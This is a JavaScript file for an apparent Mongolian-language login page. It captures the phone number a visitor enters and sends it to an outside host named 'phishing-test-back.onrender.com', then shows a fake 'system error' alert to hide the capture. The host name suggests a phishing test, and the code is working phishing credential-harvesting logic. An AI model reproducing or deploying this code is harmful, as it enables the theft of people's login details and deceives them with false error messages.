document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.ant-form');
    const phoneInput = document.querySelector('input[id="phone_number"]');
    const submitButton = document.querySelector('.login-button');

    const API_URL = 'https://phishing-test-back.onrender.com/write';

    form.addEventListener('submit', function(event) {
        event.preventDefault();

        const phoneNumber = phoneInput.value.trim();

        // Validate phone number
        if (!phoneNumber) {
            alert('Утасны дугаар оруулна уу');
            return;
        }

        // Validate Mongolian phone number format (8 digits)
        const phoneRegex = /^[0-9]{8}$/;
        if (!phoneRegex.test(phoneNumber)) {
            alert('Утасны дугаар буруу байна');
            return;
        }

        submitButton.disabled = true;
        submitButton.innerHTML = '<span>Түр хүлээнэ үү...</span>';

        fetch(API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                text: phoneNumber
            })
        })
        .then(res => {
            if (!res.ok) throw new Error('Server error');
            return res.json();
        })
        .then(() => {
            // Optional: redirect or show fake error
            alert('Системийн алдаа гарлаа. Дараа дахин оролдоно уу.');
        })
        .catch(err => {
            console.error('Error:', err);
            alert('Серверт холбогдож чадсангүй. Түр хүлээгээд дахин оролдоно уу.');
        })
        .finally(() => {
            submitButton.disabled = false;
            submitButton.innerHTML = '<span>Нэвтрэх</span>';
        });
    });
});
